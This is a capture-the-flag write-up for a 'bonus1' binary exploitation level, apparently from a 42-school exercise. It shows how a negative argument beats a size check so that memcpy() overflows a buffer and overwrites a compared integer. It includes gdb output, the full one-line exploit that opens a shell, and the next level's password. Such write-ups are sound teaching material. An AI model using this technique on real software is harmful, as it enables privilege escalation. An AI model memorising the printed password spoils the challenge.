## bonus1
The `bonus1` will crash without arguments, so we disassebled the main to see that the program expects two arguments, the first argument will be passed to `atoi(argv[1])`
and the second one to `memcpy()` but before getting there we have some tests to pass, and if we can pass the tests a function for executing the shell will be called.
The first test will be if the number we provide as argument is less or equal to 0x9 <br>`0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9`<br> and this number will be store right after a `buffer[40]` <br>` 0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax` <br>
Next our second parameter will be copied to the *buffer[40]* using the `memcpy()` function, we know this function has no checks, and we will be using it for our exploit. The size passed to `memcpy()` is our first parameter multiplied by 4 and right after the call to `memcpy()` there's a comparison if the number we passed as first argument and a huge number, if they are equal we get the shell, other the program jumps to the end. <br>
`0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46`<br>
Wait but what's the point? first there's a check for number to be less than 10 and then they want it to be = to *0x574f4c46 (1464814662)* ? what the heck.
To get around this we will use `memcpy()` to right enough character to change the value of the number and put this huge value in place *0x574f4c46*.<br>
I can hear you: *Hey, smarty pants! How are you gonna do that if `memcpy()` will copy the number you entered times 4 and you cannot enter a number greater than 9 and the number is 40 bytes above* ?
Me: Hey don't you remember those times working on the *libft* and when you passed a negative number for an unsigned type it will become a huge number, so that's what we are going to do here, let find the *offset* I worte this rudmentary program to help us find a negative number multiplied by 4 that will give what we want
```
#include <stdio.h>
int			main(void) {
	unsigned int n = -2147483638;
	printf("%u\n", n * 4);
	return (0);
}

./a.out
40
```
Lets try with 40
*does work* let's try 44 `-2147483637`
```
(gdb) r -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

(gdb) i r
eax            0x0	0
ecx            0x41414141	1094795585 <---- look right here 
edx            0xbffff69c	-1073744228
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff6b0	0xbffff6b0
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0xb7e454d3	0xb7e454d3 <__libc_start_main+243>
eflags         0x200a02	[ IF OF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
Now we just need to change the last for bytes to the huge number like so:
```
./bonus1 -2147483637 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")

$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
